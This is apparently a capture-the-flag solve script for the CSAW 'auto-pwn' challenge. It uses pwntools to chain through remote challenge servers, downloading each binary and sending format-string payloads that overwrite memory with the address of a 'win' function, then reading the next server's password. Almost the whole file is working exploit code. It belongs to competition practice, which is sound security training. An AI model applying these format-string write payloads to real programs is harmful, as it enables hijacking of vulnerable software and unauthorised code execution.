from pwn import *
import os



#simulate 1
'''
pw = b'cd80d3cd8a479a18bbc9652f3631c61c'
url = 'auto-pwn.chal.csaw.io'
port = 11001


for i in range(100):
    if (port = 11016):
        break
    io = remote(url, port)
    print(io.recv())
    io.sendline(pw)
    print(io.recvuntil(b'Here is the binary that is currently running on this box: \n-------------------------------------------------------------------\n'))
    fp = open('bin', 'wb')
    fp.write(io.recvuntil(b'\n-------------------------------------------------------------------'))
    print(io.recv())
    fp.close()
    os.system("xxd -r bin > real")
    elf = ELF('./real')
    payload = b'AA'+p32(0x0804e028+2)+p32(0x0804e028)+b'%2042x'+b'%6$hn%'
    payload += str(elf.sym['win'] - 0x08040000 - 2042 - 10).encode('utf-8')
    payload += b'x%7$hn'
    print(payload)
    io.sendline(payload)
    io.sendline('cat message.txt')
    io.recvuntil(b'Sorry, but your flag is in another box! nc auto-pwn.chal.csaw.io ')
    port = int(io.recv(5))
    io.recvuntil('and use password ')
    pw = io.recv(32)
    io.close()
'''

'''
url = 'auto-pwn.chal.csaw.io'
port = 11016
pw = 'a60d54c8e22e29052bf16dd854d189ab'

for i in range(100):
    if (port == 11031):
        print(pw)
    io = remote(url, port)
    print(io.recv())
    io.sendline(pw)
    print(io.recvuntil(b'Here is the binary that is currently running on this box: \n-------------------------------------------------------------------\n'))
    fp = open('bin', 'wb')
    fp.write(io.recvuntil(b'\n-------------------------------------------------------------------'))
    print(io.recv())
    fp.close()
    os.system("xxd -r bin > real")
    elf = ELF('./real')
    payload = b'AAAAA%'
    payload += str(elf.sym['win'] - 0x400000 - 5).encode('utf-8')
    payload += b'x%8$hn'
    payload += p64(0x405068)
    print(payload)
    io.sendline(payload)
    io.sendline('cat message.txt')
    io.recvuntil(b'Sorry, but your flag is in another box! nc auto-pwn.chal.csaw.io ')
    port = int(io.recv(5))
    io.recvuntil('and use password ')
    pw = io.recv(32)
    io.close()


'''

url = 'auto-pwn.chal.csaw.io'
port = 11031
pw = '676b8b041ae5640ba189fe0fa12a0fe3'
for i in range(100):
    io = remote(url, port)
    print(io.recv())
    io.sendline(pw)
    print(io.recvuntil(b'Here is the binary that is currently running on this box: \n-------------------------------------------------------------------\n'))
    fp = open('bin', 'wb')
    fp.write(io.recvuntil(b'\n-------------------------------------------------------------------'))
    print(io.recv())
    fp.close()
    os.system("xxd -r bin > real")
    elf = ELF('./real')
    break
